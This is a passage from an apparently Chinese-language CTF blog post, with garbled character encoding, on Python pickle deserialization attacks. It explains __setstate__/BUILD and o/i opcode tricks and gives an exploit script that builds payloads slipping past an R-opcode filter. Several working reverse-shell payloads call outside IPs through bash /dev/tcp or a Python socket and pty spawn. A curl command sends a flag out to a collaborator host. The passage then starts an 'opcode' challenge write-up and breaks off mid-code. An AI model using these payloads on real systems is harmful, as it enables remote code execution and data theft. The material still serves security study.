&lt;h3 id="--ä½¿ç”¨__setstate__bbå®ç°rce">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>__setstate__&lt;/code>&amp;amp;&lt;code>b'b'&lt;/code>å®ç°rce&lt;/h3>
&lt;p>å¦ä¸€ç§æ–¹å¼æ˜¯ç”¨BUILDæŒ‡ä»¤&lt;code>b'b'&lt;/code>åŠè¿›è¡Œrceã€‚&lt;/p>
&lt;p>åœ¨pickleæºç ä¸­BUILDæŒ‡ä»¤æ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img">&lt;/p>
&lt;p>å¦‚æœä¸€ä¸ªå®ä¾‹instæ‹¥æœ‰&lt;code>__setstate__&lt;/code>æ–¹æ³•ï¼Œåˆ™æŠŠ&lt;code>state&lt;/code>äº¤ç»™&lt;code>__setstate__&lt;/code>æ–¹æ³•æ¥å¤„ç†ï¼›å¦åˆ™ç›´æ¥æŠŠ&lt;code>state&lt;/code>è¿™ä¸ª&lt;code>dist&lt;/code>çš„å†…å®¹åˆå¹¶åˆ°&lt;code>inst.__dict__ &lt;/code>å†…ã€‚&lt;/p>
&lt;p>å¦‚æœä¸€ä¸ªç±»åŸæœ¬æ²¡æœ‰&lt;code>__setstate__&lt;/code>è¿™ä¸ªæ–¹æ³•ï¼Œå½“æˆ‘ä»¬ç”¨&lt;code>{'__setstate__': os.system}&lt;/code>æ¥BUILDè¿™ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆç°åœ¨å¯¹è±¡çš„&lt;code>__setstate__&lt;/code>å°±å˜æˆäº†&lt;code>os.system&lt;/code>ï¼›æ¥ä¸‹æ¥åˆ©ç”¨&lt;code>&amp;quot;ls /&amp;quot;&lt;/code>æ¥å†æ¬¡BUILDè¿™ä¸ªå¯¹è±¡ï¼Œåˆ™ä¼šæ‰§è¡Œ&lt;code>setstate(&amp;quot;ls /&amp;quot;)&lt;/code> ï¼Œè€Œæ­¤æ—¶&lt;code>__setstate__&lt;/code>å·²ç»è¢«æˆ‘ä»¬è®¾ç½®ä¸º&lt;code>os.system&lt;/code>ï¼Œå› æ­¤å®ç°äº†rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;amelia&amp;#39;&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">grade&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;A1&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Student&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">}(V__setstate__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">cos&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">system&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">ubVls /&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">b.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># shell = b&amp;#34;&amp;#34;&amp;#34;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;\nb.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png" alt="image-20210810025215320">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png" alt="image-20210810025143114">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆåŠŸåšåˆ°äº†rce~~åå¼¹shellå½“ç„¶ä¹Ÿå¯ä»¥&lt;/p>
&lt;h3 id="--ä½¿ç”¨_instantiateload_objload_instbobiå®ç°rce">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>_instantiate()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>&amp;amp;&lt;code>b'o'&lt;/code>&amp;amp;&lt;code>b'i'&lt;/code>å®ç°rce&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>_instantiate()&lt;/code>: Create a new object via klass(*args); Leads to arbitrary function call actually&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span>
&lt;span style="color:#111">hasattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;__getinitargs__&amp;#34;&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75715e"># Arbitrary function all&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;in constructor for &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">: &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exc_info&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__new__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_obj()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_obj&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Stack is ... markobject classobject arg1 arg2 ...&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_obj&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_inst()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_inst&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># read from user input&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">klass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># get args from stack&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_inst&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">list&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;((&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;lisubprocess&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Popen&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;print(&amp;#39;pwned!&amp;#39;)&amp;#34;&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åå¼¹shellå½“ç„¶ä¹Ÿå¯ éƒ½è¯´äº†æ˜¯rceäº†&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pty&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#34;182.92.191.192&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">50000&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dup2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fileno&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#111">pty&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">spawn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((&amp;#34;8.8.8.8&amp;#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­8 - [å·…å³°æå®¢ 2021]opcode
&lt;/h4>
&lt;/summary>
&lt;p>é¦–é¡µæ˜¯ç™»å½•æ¡†ï¼Œä»»æ„å€¼å‡å¯ç™»å…¥ æ˜é¢ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿ æŠ“åŒ…åçœ‹åˆ°postä¼ å…¥å‚æ•°æœ‰ä¸‰ä¸ª username, password, imagePathï¼Œè¿™é‡Œçš„imagePathä¹Ÿå¯è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œçœ‹ä¸€ä¸‹åç«¯æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png" alt="image-20211024145247073">&lt;/p>
&lt;p>ç¬¬ä¸€çœ¼çœ‹è¿‡å»æ˜¯pç‰›çš„é¢˜å’Œå¦ä¸€ä¸ªé¢˜çš„æ‚äº¤äº†ï¼Œé™åˆ¶builtinså¹¶ä¸”ä¸èƒ½æœ‰Ræ“ä½œç ï¼Œå…¥å£å¤„åœ¨44è¡Œçš„&lt;code>session['data']&lt;/code>å¤„&lt;/p>
&lt;p>ä½†æ˜¯æˆ‘æ²¡ä»”ç»†æ³¨æ„çš„åœ°æ–¹æ˜¯17è¡Œï¼Œè·Ÿpç‰›çš„é‚£ä¸ªé¢˜ä¸€å¯¹æ¯”å°±èƒ½çœ‹å‡ºæ¥è¿™æ ·çš„å†™æ³•&lt;u>å› ä¸ºæ˜¯å•ç‹¬çš„defè€Œä¸æ˜¯åœ¨å¯¹PickleSerializerè¿›è¡Œä¿®æ”¹ï¼Œå®Œå…¨åšä¸åˆ°é‡å†™&lt;code>pickle.loads&lt;/code>æ–¹æ³•ï¼Œåªæ˜¯ä¸ªæ‘†è®¾&lt;/u>ï¼Œç›¸å½“äºä»…å¯¹Ræ“ä½œç è¿›è¡Œäº†é™åˆ¶ï¼Œç¬‘å˜»äº†&lt;/p>
&lt;p>ç›´æ¥ä¸Š&lt;code>eval()&lt;/code>+&lt;code>b'o'&lt;/code>æ¥å¼¹shelläº†ï¼Œä¸å¤šbb&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">eval&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/101.35.113.107/8426 0&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ˜¯ç”¨&lt;code>system()&lt;/code>+&lt;code>curl&lt;/code>+&lt;code>b'o'&lt;/code>å¤–å¸¦flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl burp_collaborator.net/?flag=`app/readflag`&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åç”Ÿæˆb64çš„å†…å®¹ï¼ˆç”¨&lt;code>'''&lt;/code>çš„å¥½å¤„æ˜¯ä¸ç”¨è€ƒè™‘å¤ªå¤šå¼•å·è½¬ä¹‰çš„é—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
